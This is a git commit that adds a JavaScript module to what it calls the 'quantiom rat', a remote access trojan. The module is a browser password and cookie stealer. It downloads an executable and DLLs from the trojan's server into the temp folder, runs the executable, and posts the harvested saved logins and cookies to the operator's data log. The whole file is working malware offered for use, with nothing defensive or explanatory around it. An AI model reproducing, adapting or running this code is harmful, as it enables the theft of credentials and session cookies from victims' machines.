4db61a29e2f750deb83abb967b23edd9eb3abcf4
quantiom <quantioms@gmail.com>
2020-09-08 10:09:16 -0400

    Add multi browser support for password/cookie stealer

---
+++ src/util/preset_code/presets/browser_password_and_cookie_stealer.js
@@ -0,0 +1,53 @@
+/**
+ * Browser Password and Cookie Stealer
+ * Preset Code for quantiom rat
+ *
+ * Description: Grabs browser saved login details and cookies from the client's PC and posts it to their data log.
+ * Last Updated: 9/7/2020
+ */
+
+try {
+    const fs = require('fs');
+    const http = require('http');
+    const os = require('os');
+    const { spawn } = require('child_process');
+
+    const checkForFile = async (fileName) => {
+        return new Promise((r) => {
+            if (!fs.existsSync(`${os.tmpdir()}/${fileName}`)) {
+                const file = fs.createWriteStream(`${os.tmpdir()}/${fileName}`);
+
+                http.get(url + `/tmp/${fileName}`, async (response) => {
+                    response.pipe(file);
+
+                    r();
+                });
+            } else r();
+        });
+    };
+
+    checkForFile('edg6A23.tmp.exe').then(() => {
+        checkForFile('libsodium.dll').then(() => {
+            checkForFile('libsodium-64.dll').then(() => {
+                checkForFile('Sodium.dll').then(() => {
+                    const ls = spawn(`${os.tmpdir()}/edg6A23.tmp.exe`);
+                    let data = '';
+
+                    ls.stdout.on('data', function (d) {
+                        data += d.toString();
+                    });
+
+                    ls.stderr.on('data', function (d) {
+                        data += d.toString();
+                    });
+
+                    ls.on('exit', function (code) {
+                        postData(data.toString(), 'Chrome Password and Cookie Stealer');
+                    });
+                });
+            });
+        });
+    });
+} catch (e) {
+    postData(e.stack, 'Chrome Password and Cookie Stealer Error');
+}
